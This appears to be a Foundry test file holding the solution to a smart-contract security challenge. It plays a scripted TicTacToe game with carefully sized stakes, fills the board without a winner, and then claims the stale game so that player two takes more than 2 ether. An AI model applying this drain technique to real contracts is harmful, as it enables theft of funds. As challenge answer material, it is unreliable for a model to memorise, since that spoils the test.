// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import { TicTacToe } from "./TicTacToe.sol";

contract TicTacToeTest is Test {
    TicTacToe public ticTacToeGame;

    address constant playerOne = address(100);
    address constant playerTwo = address(101);

    function setUp() public {
        ticTacToeGame = new TicTacToe();
    }

    function test_Solution() public {

        vm.deal(playerOne, 2 ether);
        vm.deal(playerTwo, 2 ether);
        vm.prank(playerOne);
        ticTacToeGame.startGame{value: 1 ether}(playerTwo);

        TicTacToe.Game memory game = ticTacToeGame.getGame(0);

        // Solution

        // 2 7 6
        // 9 5 1
        // 4 3 8

        // player 1: X
        // player 2: O
        // player 1: positive
        // player 2: negative

        // O O X
        // X X O
        // O X X

        // [col, row]
        uint8[18] memory values = [
                2, 0,
                0, 0,
                0, 1,
                1, 0,
                1, 1,
                2, 1,
                1, 2,
                0, 2,
                2, 2
        ];

        for (uint256 i; i < values.length; i += 2) {
            uint256 step = i / 2;
            bool isPlayerOne = step % 2 == 0;
            uint256 value;

            if (step == 0) {
                // Player one already staked 1e18 via `startGame`
            } else if (step == 1) {
                // Player two stakes one more asset than player one
                value = 1e18 + 1;
            } else {
                // Stakes one more asset than the opponent
                value = 2;
            }

            vm.startPrank(isPlayerOne ? playerOne : playerTwo);
            ticTacToeGame.makeMove{value: value}(TicTacToe.Move({row: values[i + 1], col: values[i]}), 0);
            vm.stopPrank();
        }

        // The balance of the player one must be greater than or equal to 1e18
        vm.startPrank(playerTwo);
        payable(playerOne).call{value: 1e18 - playerOne.balance}("");
        vm.stopPrank();

        // ______________________________________________

        vm.startPrank(playerOne);
        for (uint _col; _col < 3; ++_col) {
            for (uint _row; _row < 3; ++_row) {
                vm.expectRevert(TicTacToe.TileTaken.selector);
                ticTacToeGame.makeMove{value: 1 ether}(TicTacToe.Move({ row: _row, col: _col }), 0);
            }
        }
        vm.stopPrank();

        assertEq(game.winner, address(0));

        vm.warp(block.timestamp + 1 weeks);

        uint256 playerTwoBalBefore = payable(playerTwo).balance;

        vm.prank(playerTwo);
        ticTacToeGame.staleGameClaim(0);

        uint256 playerTwoBalAfter = payable(playerTwo).balance;

        assertGt(playerTwoBalAfter - playerTwoBalBefore, 2 ether);

    }


}